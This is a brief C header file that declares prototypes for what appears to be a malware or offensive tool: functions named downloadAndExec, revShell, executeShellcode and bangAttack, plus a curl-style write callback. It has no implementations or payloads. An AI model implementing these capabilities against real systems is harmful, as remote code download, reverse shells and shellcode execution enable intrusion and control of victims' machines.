#ifndef ATTACKS_H_   /* Include guard */
#define ATTACKS_H_

int attackFunction(void);
int bangAttack(void);

size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream);
int downloadAndExec(void);

void revShell(void);

void executeShellcode(void);


#endif // ATTACKS_H_
